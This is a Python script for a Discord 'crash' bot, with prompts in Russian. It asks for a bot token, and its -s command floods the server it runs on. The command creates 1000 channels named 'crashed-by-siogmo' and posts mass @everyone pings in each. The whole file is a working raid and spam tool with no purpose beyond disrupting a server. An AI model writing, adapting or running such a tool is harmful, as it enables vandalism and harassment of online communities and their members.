from discord.ext import commands
from random import randint
from colorama import init, Fore
from time import sleep
import discord
import main


def crash():
	init()
	BOT_TOKEN = input(Fore.LIGHTRED_EX + 'Введите токен бота:  ')
	print('\nДобавьте своего бота на сервер и в любом чате напишите -s')

	bot = commands.Bot(command_prefix="-", intents=discord.Intents.all())


	@bot.command('s')
	async def on_ready(ctx):
		for i in range(1000):
			await ctx.guild.create_text_channel(name=f'crashed-by-siogmo-{i}')
			channel = discord.utils.get(ctx.guild.channels, name=f'crashed-by-siogmo-{i}')
			for _ in range(randint(1, 10)):
				await channel.send('@everyone\ncrashed by siogmo')
			i += 1


	bot.run(BOT_TOKEN)

	sleep(3)
	main.main()
